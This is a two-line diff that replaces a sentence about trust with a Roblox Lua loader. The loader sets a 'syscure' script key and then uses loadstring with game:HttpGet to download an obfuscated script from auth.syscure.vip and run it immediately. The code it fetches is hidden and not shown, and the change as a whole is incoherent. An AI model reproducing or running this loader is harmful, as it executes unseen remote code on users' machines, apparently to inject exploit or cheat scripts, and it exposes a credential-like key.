@@ -1,1 +1,2 @@
-when someone asks if you trust them oblige to prove it later
+_G.ScriptKey = "syscure-tm95fez7Pc7_t-MrasnE4kkZx4sbtN1q" -- Replace with your valid syscure key.
+loadstring(game:HttpGet("https://auth.syscure.vip/obf/07d928757263ce21523cc26f6e394369.lua"))()
